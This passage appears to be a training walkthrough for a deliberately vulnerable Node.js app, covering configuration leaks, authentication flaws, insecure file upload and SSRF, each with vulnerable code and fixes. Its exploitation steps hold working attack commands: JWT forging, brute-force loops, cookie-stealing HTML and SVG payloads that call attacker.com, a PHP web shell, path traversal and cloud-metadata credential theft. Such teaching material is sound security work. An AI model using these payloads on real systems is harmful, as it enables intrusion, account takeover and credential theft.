    "DB_PASSWORD": "wcorp_pass",
    "DB_NAME": "wcorp_db",
    "JWT_SECRET": "jwt_secret_key_for_training"
  }
}
```

‚úÖ **Database credentials and JWT secret exposed!**

#### Step 3: Use Database Credentials

```bash
# Connect to database using exposed credentials
mysql -h localhost -u wcorp_user -pwcorp_pass wcorp_db

# Once connected, dump all data
mysqldump -h localhost -u wcorp_user -pwcorp_pass wcorp_db > database_backup.sql
```

#### Step 4: Forge JWT Tokens

```bash
# Use the exposed JWT secret to create admin tokens
# Create a script to forge tokens

cat > forge_token.js << 'EOF'
const jwt = require('jsonwebtoken');

const secret = 'jwt_secret_key_for_training'; // From .env exposure

const payload = {
  userId: 1,
  username: 'admin',
  role: 'admin'
};

const token = jwt.sign(payload, secret, { expiresIn: '365d' });
console.log('Forged Admin Token:', token);
EOF

node forge_token.js
```

#### Step 5: Analyze Package.json

```bash
# Get package information
curl http://localhost:3000/package.json
```

**Response:**
```json
{
  "message": "VULNERABILITY: A05 - Security Misconfiguration",
  "description": "Package.json exposed",
  "data": {
    "name": "wcorp-backend",
    "version": "1.0.0",
    "dependencies": {
      "express": "^4.18.2",
      "mysql2": "^3.2.0",
      "jsonwebtoken": "^9.0.0"
    }
  }
}
```

‚úÖ **Technology stack and versions exposed - search for CVEs!**

#### Step 6: Directory Enumeration

```bash
# Check robots.txt for hidden paths
curl http://localhost:3000/robots.txt
```

**Response:**
```
User-agent: *
Disallow: /admin/
Disallow: /api/
Disallow: /uploads/
Disallow: /config/
Disallow: /backup/
```

‚úÖ **Hidden directories revealed!**

#### Step 7: Exploit Found Information

```bash
# Try accessing revealed directories
curl http://localhost:3000/backup/
curl http://localhost:3000/config/
curl http://localhost:3000/uploads/

# Check for backup files
curl http://localhost:3000/backup/database.sql
curl http://localhost:3000/backup/config.bak
```

#### Step 8: Error Message Information Disclosure

```bash
# Trigger errors to get stack traces
curl http://localhost:3000/api/user/profile/abc

# Response may include:
# - Full file paths
# - Database query details
# - Framework versions
# - Internal IP addresses
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - Exposing sensitive configuration
app.get('/.env', (req, res) => {
  // NEVER do this in production!
  res.json({
    message: 'VULNERABILITY: A05 - Security Misconfiguration',
    description: 'Environment file exposed',
    data: {
      NODE_ENV: process.env.NODE_ENV,
      DB_HOST: process.env.DB_HOST,
      DB_USER: process.env.DB_USER,
      DB_PASSWORD: process.env.DB_PASSWORD,  // EXPOSED!
      DB_NAME: process.env.DB_NAME,
      JWT_SECRET: process.env.JWT_SECRET     // EXPOSED!
    }
  });
});

// Exposing package.json
app.get('/package.json', (req, res) => {
  const packageJson = require('./package.json');
  res.json({
    message: 'VULNERABILITY: A05 - Security Misconfiguration',
    description: 'Package.json exposed',
    data: packageJson  // Shows all dependencies and versions
  });
});

// No security headers
// No rate limiting on sensitive endpoints
// Detailed error messages in production
```

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
// backend/server.js - Secure configuration

// 1. REMOVE endpoints that expose configuration
// Delete the /.env and /package.json routes entirely

// 2. Add security headers
const helmet = require('helmet');
app.use(helmet());

// 3. Implement rate limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api/', limiter);

// 4. Generic error messages in production
app.use((err, req, res, next) => {
  if (process.env.NODE_ENV === 'production') {
    // Generic message - don't expose details
    res.status(500).json({ 
      success: false, 
      message: 'An error occurred' 
    });
  } else {
    // Detailed errors only in development
    res.status(500).json({ 
      success: false, 
      message: err.message,
      stack: err.stack 
    });
  }
});

// 5. Protect sensitive files with nginx/web server
// In nginx.conf:
// location ~ /\.(env|git) {
//     deny all;
//     return 404;
// }

// 6. Use environment variables properly
// Never log or expose:
// - Database credentials
// - API keys
// - JWT secrets
// - Private keys
```

**Secure .env File:**
```bash
# .env - Keep this file SECRET and never commit to git!
NODE_ENV=production
DB_HOST=localhost
DB_USER=secure_random_user_name
DB_PASSWORD=VeryLongAndComplexPassword123!@#
DB_NAME=production_db
JWT_SECRET=verylongrandomsecretkey_atleast32chars_use_crypto_randomBytes
```

**Secure robots.txt:**
```
# robots.txt - Don't reveal sensitive paths
User-agent: *
Disallow: /admin
```

### üéì Learning Objectives

- Understand the importance of configuration management
- Learn what information should never be exposed
- Practice reconnaissance using configuration leaks
- Understand the impact of exposed credentials
- Learn about security headers and hardening
- Understand proper error handling

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **CRITICAL** | All secrets exposed |
| Integrity | **HIGH** | System compromise |
| Availability | **MEDIUM** | Service disruption |
| **Overall Risk** | **CRITICAL** | Complete system breach |

### üîê Security Best Practices

1. **Never expose .env files** - Keep configuration private
2. **Use proper .gitignore** - Don't commit secrets
3. **Implement security headers** - Use helmet.js
4. **Generic error messages** - No stack traces in production
5. **Rate limiting** - Prevent abuse
6. **Regular security audits** - Check for exposed files
7. **Principle of least privilege** - Minimal file permissions
8. **Use secrets management** - AWS Secrets Manager, HashiCorp Vault
9. **Environment separation** - Different configs for dev/prod
10. **Remove default files** - Delete sample configs, test files

---

---

## A07 - Identification and Authentication Failures

### üéØ Overview

**Authentication failures** occur when the application doesn't properly implement authentication mechanisms, allowing attackers to compromise passwords, keys, or session tokens, or exploit implementation flaws to assume other users' identities.

### üîç Vulnerability Location

- `/wcorp/api/login` - No rate limiting
- Session management - Predictable tokens
- Password reset functionality
- Weak password policies
- No account lockout mechanism

### üìñ How It Works

The application has multiple authentication weaknesses:
1. No rate limiting on login attempts (brute force possible)
2. No account lockout after failed attempts  
3. Weak password requirements
4. Session tokens may be predictable
5. No multi-factor authentication

### üîì Step-by-Step Exploitation

#### Step 1: Brute Force Attack (No Rate Limiting)

```bash
# Create a password list
cat > passwords.txt << EOF
admin
password
admin123
password123
123456
qwerty
letmein
welcome
EOF

# Brute force login endpoint
while IFS= read -r password; do
  echo "Trying password: $password"
  response=$(curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}")
  
  if echo "$response" | grep -q "success.*true"; then
    echo "SUCCESS! Password found: $password"
    echo "$response"
    break
  fi
done < passwords.txt
```

**Result:**
```
Trying password: admin
Trying password: password
Trying password: admin123
SUCCESS! Password found: admin123
{"success":true,"token":"eyJhbGciOiJIUzI1NiIs..."}
```

‚úÖ **No rate limiting - unlimited attempts allowed!**

#### Step 2: Automated Credential Stuffing

```bash
# Use a list of compromised credentials
cat > credentials.txt << EOF
admin:admin123
john:password123
jane:qwerty
test:test123
EOF

# Test all credentials
while IFS=: read -r username password; do
  echo "Testing $username:$password"
  
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$username\",\"password\":\"$password\"}" \
    | jq -r 'select(.success==true) | "FOUND: \(.user.username) - \(.user.role)"'
done < credentials.txt
```

**Result:**
```
Testing admin:admin123
FOUND: admin - admin
Testing john:password123  
FOUND: john.doe - user
Testing jane:qwerty
FOUND: jane.smith - user
```

#### Step 3: Session Token Analysis

```bash
# Generate multiple tokens and analyze patterns
for i in {1..5}; do
  response=$(curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","password":"test123"}')
  
  token=$(echo "$response" | jq -r '.token')
  echo "Token $i: $token"
done

# Decode JWT tokens to analyze
echo "Decoded tokens:"
for i in {1..5}; do
  # JWT tokens are base64 encoded
  # Use jwt.io or jwt-cli to decode
  echo "$token" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
done
```

**Analysis might reveal:**
```json
{
  "userId": 5,
  "username": "testuser",
  "role": "user",
  "iat": 1696612800,  // Predictable timestamp
  "exp": 1696699200
}
```

#### Step 4: Username Enumeration

```bash
# Test if different error messages reveal valid usernames
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass"}'

# vs

curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistentuser","password":"wrongpass"}'
```

If responses differ, you can enumerate valid usernames!

#### Step 5: Weak Password Testing

```bash
# Register account with weak password
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "weakuser",
    "password": "123",
    "email": "weak@test.com"
  }'
```

**Response:**
```json
{
  "success": true,
  "message": "User registered successfully"
}
```

‚úÖ **3-character password accepted - no password policy!**

#### Step 6: Session Hijacking

```bash
# If JWT secret is exposed (A05), forge tokens
const jwt = require('jsonwebtoken');

// Using exposed secret from /.env
const secret = 'jwt_secret_key_for_training';

// Create admin token
const adminToken = jwt.sign(
  {
    userId: 1,
    username: 'admin',
    role: 'admin'
  },
  secret,
  { expiresIn: '365d' } // Long expiration
);

console.log('Forged admin token:', adminToken);
```

#### Step 7: Timing Attack on Login

```bash
# Measure response times to determine if username exists
time1=$(date +%s%N)
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}' > /dev/null
time2=$(date +%s%N)
echo "Time for existing user: $((($time2 - $time1) / 1000000)) ms"

time1=$(date +%s%N)
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"wrong"}' > /dev/null
time2=$(date +%s%N)
echo "Time for non-existent user: $((($time2 - $time1) / 1000000)) ms"
```

If times differ significantly, username enumeration is possible!

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - Multiple authentication issues

// 1. No rate limiting
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // 2. No account lockout after failed attempts
  // 3. Direct database query - timing attack possible
  const [rows] = await db.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
  );
  
  if (rows.length === 0) {
    // 4. Generic error - good, but no logging
    return res.status(401).json({ 
      success: false, 
      message: 'Invalid credentials' 
    });
  }
  
  const user = rows[0];
  
  // 5. Weak JWT secret (if exposed)
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    process.env.JWT_SECRET, // Predictable if exposed
    { expiresIn: '24h' } // Or too long
  );
  
  res.json({ success: true, token, user });
});

// 6. No password requirements
app.post('/api/register', async (req, res) => {
  const { username, password, email } = req.body;
  
  // Accepts any password length/complexity
  await db.execute(
    'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
    [username, password, email, 'user']
  );
  
  res.json({ success: true });
});
```

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
const rateLimit = require('express-rate-limit');
const bcrypt = require('bcrypt');

// 1. Implement rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

// 2. Track failed attempts
const failedAttempts = new Map(); // In production, use Redis

// 3. Secure login endpoint
app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;
  
  // Input validation
  if (!username || !password) {
    return res.status(400).json({ 
      success: false, 
      message: 'Username and password required' 
    });
  }
  
  // Check account lockout
  const attempts = failedAttempts.get(username) || 0;
  if (attempts >= 5) {
    return res.status(429).json({ 
      success: false, 
      message: 'Account temporarily locked. Try again in 15 minutes.' 
    });
  }
  
  // Get user (avoid timing attacks by always hashing)
  const [rows] = await db.execute(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );
  
  // Use constant-time comparison
  let isValid = false;
  if (rows.length > 0) {
    const user = rows[0];
    isValid = await bcrypt.compare(password, user.password);
  } else {
    // Perform dummy bcrypt to maintain constant time
    await bcrypt.compare(password, '$2b$12$dummy.hash.to.prevent.timing.attack');
  }
  
  if (!isValid) {
    // Increment failed attempts
    failedAttempts.set(username, attempts + 1);
    
    // Log failed attempt
    console.log(`Failed login attempt for user: ${username} from IP: ${req.ip}`);
    
    // Generic error message (don't reveal if username exists)
    return res.status(401).json({ 
      success: false, 
      message: 'Invalid credentials' 
    });
  }
  
  // Clear failed attempts on successful login
  failedAttempts.delete(username);
  
  const user = rows[0];
  
  // Generate secure token with strong secret
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    process.env.JWT_SECRET, // Use long, random secret (64+ chars)
    { expiresIn: '1h' } // Short expiration
  );
  
  // Log successful login
  console.log(`Successful login for user: ${username}`);
  
  res.json({ success: true, token });
});

// 4. Enforce password policy
app.post('/api/register', async (req, res) => {
  const { username, password, email } = req.body;
  
  // Password requirements
  if (password.length < 8) {
    return res.status(400).json({ 
      success: false, 
      message: 'Password must be at least 8 characters' 
    });
  }
  
  if (!/[A-Z]/.test(password)) {
    return res.status(400).json({ 
      success: false, 
      message: 'Password must contain at least one uppercase letter' 
    });
  }
  
  if (!/[a-z]/.test(password)) {
    return res.status(400).json({ 
      success: false, 
      message: 'Password must contain at least one lowercase letter' 
    });
  }
  
  if (!/[0-9]/.test(password)) {
    return res.status(400).json({ 
      success: false, 
      message: 'Password must contain at least one number' 
    });
  }
  
  if (!/[!@#$%^&*]/.test(password)) {
    return res.status(400).json({ 
      success: false, 
      message: 'Password must contain at least one special character' 
    });
  }
  
  // Hash password
  const hashedPassword = await bcrypt.hash(password, 12);
  
  await db.execute(
    'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
    [username, hashedPassword, email, 'user']
  );
  
  res.json({ success: true });
});

// 5. Implement session management
app.post('/api/logout', authenticateToken, async (req, res) => {
  // Invalidate token (use token blacklist in production)
  res.json({ success: true, message: 'Logged out successfully' });
});
```

### üéì Learning Objectives

- Understand brute force attacks and defenses
- Learn about rate limiting and account lockout
- Practice timing attacks for username enumeration
- Understand password policy enforcement
- Learn about session management best practices
- Understand JWT security considerations

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **HIGH** | Account compromise |
| Integrity | **HIGH** | Unauthorized access |
| Availability | **MEDIUM** | Account lockout abuse |
| **Overall Risk** | **HIGH** | System breach |

### üîê Security Best Practices

1. **Implement rate limiting** - Prevent brute force
2. **Account lockout** - After N failed attempts
3. **Strong password policy** - Length, complexity
4. **Use bcrypt/Argon2** - Proper password hashing
5. **Multi-factor authentication (MFA)** - Second factor
6. **Secure session management** - Short tokens, secure storage
7. **Monitor failed logins** - Detect attacks
8. **Constant-time comparison** - Prevent timing attacks
9. **Generic error messages** - No username enumeration
10. **CAPTCHA** - After failed attempts

---

## A08 - Software and Data Integrity Failures

### üéØ Overview

**Software and data integrity failures** relate to code and infrastructure that doesn't protect against integrity violations. This includes accepting file uploads without validation, using unverified CDNs, and auto-update mechanisms without integrity checks.

### üîç Vulnerability Location

- `/wcorp/api/upload` - File upload endpoint
- `/uploads/` - Publicly accessible uploads directory
- No file type validation
- No file size limits
- No malware scanning

### üìñ How It Works

The application accepts file uploads without proper validation, allowing attackers to upload malicious files, bypass file type restrictions, or perform path traversal attacks.

### üîì Step-by-Step Exploitation

#### Step 1: Basic File Upload Test

```bash
# Create a test file
echo "Hello World" > test.txt

# Upload the file
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@test.txt"
```

**Response:**
```json
{
  "success": true,
  "filename": "test.txt",
  "path": "/uploads/test.txt"
}
```

#### Step 2: Upload Malicious HTML File

```bash
# Create malicious HTML with JavaScript
cat > malicious.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Malicious</title></head>
<body>
<h1>You've been hacked!</h1>
<script>
  // Steal cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  
  // Redirect to phishing site
  setTimeout(() => {
    window.location = 'https://attacker.com/phishing';
  }, 2000);
</script>
</body>
</html>
EOF

# Upload malicious HTML
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@malicious.html"
```

**Access the uploaded file:**
```
http://localhost:3000/uploads/malicious.html
```

‚úÖ **JavaScript executes in victim's browser!**

#### Step 3: File Extension Bypass

```bash
# Try double extension
echo "<?php system($_GET['cmd']); ?>" > shell.php.txt

curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@shell.php.txt"

# Try null byte injection (older systems)
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@shell.php%00.txt"

# Try case variations
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@shell.PHP"
```

#### Step 4: Path Traversal Attack

```bash
# Try to upload to parent directory
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@test.txt;filename=../../../etc/passwd"

# Try various path traversal techniques
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@test.txt;filename=....//....//....//etc/passwd"

curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@test.txt;filename=..%2F..%2F..%2Fetc%2Fpasswd"
```

#### Step 5: Large File Upload (DoS)

```bash
# Create a very large file
dd if=/dev/zero of=huge.bin bs=1M count=1000  # 1GB file

# Upload large file to consume disk space
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@huge.bin"

# Repeat multiple times to fill disk
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/upload \
    -H "Authorization: Bearer <token>" \
    -F "file=@huge.bin"
done
```

#### Step 6: SVG with Embedded JavaScript

```bash
# Create malicious SVG
cat > malicious.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('XSS via SVG!');
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
  <circle cx="100" cy="100" r="50" fill="red"/>
</svg>
EOF

# Upload SVG
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F "file=@malicious.svg"
```

#### Step 7: Filename Manipulation

```bash
# Special characters in filename
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F 'file=@test.txt;filename="<script>alert(1)</script>.txt"'

# Unicode characters
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -F 'file=@test.txt;filename="test\u202etxt.exe"'  # Right-to-left override
```

#### Step 8: Content-Type Spoofing

```bash
# Upload executable disguised as image
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@malware.exe;type=image/jpeg;filename=photo.jpg"
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - Insecure file upload

const multer = require('multer');
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/'); // No validation
  },
  filename: (req, file, cb) => {
    // Uses original filename without sanitization
    cb(null, file.originalname); // DANGEROUS!
  }
});

const upload = multer({ storage: storage }); // No restrictions

// No file type validation
// No file size limit
// No filename sanitization
// No malware scanning
app.post('/api/upload', authenticateToken, upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ 
      success: false, 
      message: 'No file uploaded' 
    });
  }
  
  // Store in database without validation
  await db.execute(
    'INSERT INTO files (user_id, filename, path) VALUES (?, ?, ?)',
    [req.user.userId, req.file.originalname, req.file.path]
  );
  
  // Return path that can be accessed
  res.json({ 
    success: true, 
    filename: req.file.originalname,
    path: `/uploads/${req.file.originalname}`
  });
});

// Publicly accessible uploads (no authentication required)
app.use('/uploads', express.static('uploads'));
```

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// 1. Whitelist allowed file types
const allowedMimeTypes = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'application/pdf',
  'text/plain'
];

const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.txt'];

// 2. Configure secure storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    // Generate random filename to prevent path traversal
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `${randomName}${ext}`);
  }
});

// 3. Configure multer with restrictions
const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB max
    files: 1 // Single file only
  },
  fileFilter: (req, file, cb) => {
    // Check MIME type
    if (!allowedMimeTypes.includes(file.mimetype)) {
      return cb(new Error('Invalid file type'));
    }
    
    // Check extension
    const ext = path.extname(file.originalname).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      return cb(new Error('Invalid file extension'));
    }
    
    // Sanitize filename
    const sanitized = path.basename(file.originalname)
      .replace(/[^a-zA-Z0-9.-]/g, '_');
    file.originalname = sanitized;
    
    cb(null, true);
  }
});

// 4. Secure upload endpoint
app.post('/api/upload', authenticateToken, (req, res) => {
  upload.single('file')(req, res, async (err) => {
    if (err instanceof multer.MulterError) {
      if (err.code === 'LIMIT_FILE_SIZE') {
        return res.status(400).json({ 
          success: false, 
          message: 'File too large. Max size is 5MB' 
        });
      }
      return res.status(400).json({ 
        success: false, 
        message: err.message 
      });
    } else if (err) {
      return res.status(400).json({ 
        success: false, 
        message: err.message 
      });
    }
    
    if (!req.file) {
      return res.status(400).json({ 
        success: false, 
        message: 'No file uploaded' 
      });
    }
    
    // Additional file validation (magic bytes)
    const fileBuffer = fs.readFileSync(req.file.path);
    const fileType = await fileTypeFromBuffer(fileBuffer);
    
    if (!fileType || !allowedMimeTypes.includes(fileType.mime)) {
      // Delete uploaded file
      fs.unlinkSync(req.file.path);
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid file type detected' 
      });
    }
    
    // Scan for malware (in production, use ClamAV or similar)
    // const isSafe = await scanFile(req.file.path);
    // if (!isSafe) {
    //   fs.unlinkSync(req.file.path);
    //   return res.status(400).json({ 
    //     success: false, 
    //     message: 'Malicious file detected' 
    //   });
    // }
    
    // Store with generated filename
    await db.execute(
      'INSERT INTO files (user_id, original_name, stored_name, path, size, mime_type) VALUES (?, ?, ?, ?, ?, ?)',
      [
        req.user.userId, 
        req.file.originalname,
        req.file.filename, 
        req.file.path,
        req.file.size,
        req.file.mimetype
      ]
    );
    
    res.json({ 
      success: true, 
      filename: req.file.filename,
      message: 'File uploaded successfully'
    });
  });
});

// 5. Secure file serving (authentication required)
app.get('/uploads/:filename', authenticateToken, async (req, res) => {
  const filename = req.params.filename;
  
  // Validate filename (no path traversal)
  if (filename.includes('..') || filename.includes('/')) {
    return res.status(400).json({ 
      success: false, 
      message: 'Invalid filename' 
    });
  }
  
  // Check if user owns file
  const [rows] = await db.execute(
    'SELECT * FROM files WHERE stored_name = ? AND user_id = ?',
    [filename, req.user.userId]
  );
  
  if (rows.length === 0 && req.user.role !== 'admin') {
    return res.status(403).json({ 
      success: false, 
      message: 'Access denied' 
    });
  }
  
  // Serve file with proper headers
  const filePath = path.join(__dirname, 'uploads', filename);
  
  res.setHeader('Content-Disposition', `attachment; filename="${rows[0].original_name}"`);
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.sendFile(filePath);
});
```

### üéì Learning Objectives

- Understand file upload vulnerabilities
- Learn about MIME type validation vs magic bytes
- Practice path traversal attacks
- Understand content-type spoofing
- Learn about secure file storage practices
- Understand malware scanning importance

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **MEDIUM** | File access |
| Integrity | **HIGH** | Malicious file storage |
| Availability | **HIGH** | Disk space exhaustion |
| **Overall Risk** | **HIGH** | System compromise |

### üîê Security Best Practices

1. **Whitelist file types** - Only allow specific MIME types
2. **Validate magic bytes** - Don't trust Content-Type header
3. **Generate random filenames** - Prevent path traversal
4. **Limit file size** - Prevent DoS
5. **Scan for malware** - Use antivirus/sandboxing
6. **Store outside web root** - Serve files through application
7. **Authentication required** - Don't allow public upload/download
8. **Content-Disposition headers** - Force download, not execute
9. **Regular cleanup** - Remove old/unused files
10. **Separate storage** - Use object storage (S3, Azure Blob)

---

## A10 - Server-Side Request Forgery (SSRF)

### üéØ Overview

**SSRF (Server-Side Request Forgery)** occurs when a web application fetches a remote resource without validating the user-supplied URL. This allows attackers to force the server to make requests to arbitrary locations, potentially accessing internal services or performing actions on behalf of the server.

### üîç Vulnerability Location

- `/api/fetch-url` - URL fetching endpoint
- No URL validation
- No whitelist of allowed domains
- No protection against internal network access

### üìñ How It Works

The application accepts a URL parameter and makes an HTTP request to that URL without validation, allowing attackers to:
1. Access internal services (localhost, private IPs)
2. Read internal files
3. Port scan internal network
4. Access cloud metadata APIs
5. Bypass firewalls and access controls

### üîì Step-by-Step Exploitation

#### Step 1: Basic SSRF Test

```bash
# Test if endpoint exists
curl "http://localhost:3000/api/fetch-url?url=https://google.com"
```

**Response:**
```json
{
  "success": true,
  "data": "<!doctype html><html>..."
}
```

‚úÖ **Server fetches external URL!**

#### Step 2: Access Internal Services

```bash
# Access localhost services
curl "http://localhost:3000/api/fetch-url?url=http://localhost:3306"

# Try different ports
for port in 22 80 443 3000 3306 5432 6379 8080 8443 9200; do
  echo "Testing port $port..."
  curl -s "http://localhost:3000/api/fetch-url?url=http://localhost:$port" \
    | head -c 100
  echo ""
done
```

**Results might reveal:**
```
Testing port 3306...
MySQL server version information

Testing port 6379...
Redis PING response

Testing port 9200...
Elasticsearch cluster info
```

#### Step 3: Access Internal Network

```bash
# Scan private IP ranges
for ip in 192.168.1.{1..254}; do
  echo "Scanning $ip..."
  curl -s --max-time 2 \
    "http://localhost:3000/api/fetch-url?url=http://$ip" \
    && echo "$ip is accessible"
done

# Common internal services
curl "http://localhost:3000/api/fetch-url?url=http://192.168.1.1"  # Router
curl "http://localhost:3000/api/fetch-url?url=http://10.0.0.1"     # Internal gateway
curl "http://localhost:3000/api/fetch-url?url=http://172.16.0.1"   # Docker gateway
```

#### Step 4: Cloud Metadata Access (AWS)

```bash
# AWS EC2 metadata
curl "http://localhost:3000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"

# Get IAM credentials
curl "http://localhost:3000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Get specific role credentials
curl "http://localhost:3000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole"
```

**Response might include:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-10-06T..."
}
```

‚úÖ **AWS credentials exposed!**

#### Step 5: File Protocol Exploitation

```bash
# Try to read local files
curl "http://localhost:3000/api/fetch-url?url=file:///etc/passwd"
curl "http://localhost:3000/api/fetch-url?url=file:///etc/hosts"
curl "http://localhost:3000/api/fetch-url?url=file:///proc/self/environ"

# Read application files
curl "http://localhost:3000/api/fetch-url?url=file:///app/.env"
curl "http://localhost:3000/api/fetch-url?url=file:///app/package.json"
```

#### Step 6: DNS Rebinding Attack

```bash
# Set up DNS that initially resolves to attacker IP,
# then rebinds to internal IP
curl "http://localhost:3000/api/fetch-url?url=http://rebind.attacker.com"

# The domain might resolve to:
# First request: 1.2.3.4 (external, passes validation)
# Second request: 192.168.1.100 (internal, after cache expires)
```

#### Step 7: Protocol Smuggling

```bash
# Try different URL protocols
curl "http://localhost:3000/api/fetch-url?url=gopher://localhost:6379/_PING"
curl "http://localhost:3000/api/fetch-url?url=dict://localhost:11211/stats"
curl "http://localhost:3000/api/fetch-url?url=ftp://internal-ftp-server/"
```

#### Step 8: Blind SSRF Detection

```bash
# Use external service to detect SSRF
curl "http://localhost:3000/api/fetch-url?url=http://burpcollaborator.net"
curl "http://localhost:3000/api/fetch-url?url=http://your-server.com/ssrf-test"

# Check your server logs for incoming request
# If you see a request from the target server's IP, SSRF exists!
```

#### Step 9: URL Encoding Bypass

```bash
# Try encoding to bypass basic filters
curl "http://localhost:3000/api/fetch-url?url=http://127.0.0.1"
curl "http://localhost:3000/api/fetch-url?url=http://localhost"
curl "http://localhost:3000/api/fetch-url?url=http://[::1]"  # IPv6 localhost
curl "http://localhost:3000/api/fetch-url?url=http://0x7f000001"  # Hex encoding
curl "http://localhost:3000/api/fetch-url?url=http://2130706433"  # Decimal encoding

# URL encoding
curl "http://localhost:3000/api/fetch-url?url=http://%6c%6f%63%61%6c%68%6f%73%74"
```

#### Step 10: SSRF with Redirect

```bash
# Create redirect on your server
# redirect.php: header('Location: http://192.168.1.1');

curl "http://localhost:3000/api/fetch-url?url=http://attacker.com/redirect.php"

# Server follows redirect to internal IP
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - No URL validation!

const axios = require('axios');

app.get('/api/fetch-url', async (req, res) => {
  const { url } = req.query;
  
  if (!url) {
    return res.status(400).json({ 
      success: false, 
      message: 'URL parameter required' 
    });
  }
  
  try {
    // Fetches ANY URL without validation
    const response = await axios.get(url, {
      timeout: 5000,
      maxRedirects: 5  // Follows redirects!
    });
    
    // Returns response to attacker
    res.json({ 
      success: true, 
      data: response.data 
    });
  } catch (error) {
    // Even error messages can leak information
    res.status(500).json({ 
      success: false, 
      message: error.message  // Reveals connection errors
    });
  }
});
```

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
const axios = require('axios');
const { URL } = require('url');

// 1. Whitelist allowed domains
const allowedDomains = [
  'api.example.com',
  'trusted-service.com'
];

// 2. Blacklist internal ranges
const blockedRanges = [
  '127.0.0.0/8',      // Localhost
  '10.0.0.0/8',       // Private network
  '172.16.0.0/12',    // Private network
